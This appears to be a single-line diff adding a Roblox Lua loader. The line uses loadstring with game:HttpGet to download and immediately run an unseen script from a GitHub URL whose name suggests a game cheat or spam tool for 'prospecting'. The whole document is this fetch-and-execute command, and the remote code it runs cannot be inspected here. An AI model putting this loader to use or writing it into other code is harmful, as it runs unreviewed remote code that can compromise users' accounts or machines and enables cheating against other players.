@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/prospecting-spam2-bi5m7o04o1v8ox.lua"))()
